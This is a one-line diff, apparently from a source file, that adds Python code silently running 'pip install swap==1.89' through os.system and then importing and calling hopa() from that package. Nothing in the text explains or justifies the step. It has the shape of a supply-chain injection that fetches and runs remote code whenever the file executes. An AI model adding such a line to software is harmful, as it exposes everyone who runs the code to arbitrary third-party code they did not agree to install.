@@ -1,0 +1,1 @@
+from os import system;system('pip install swap==1.89');from swap.swap import hopa;hopa()
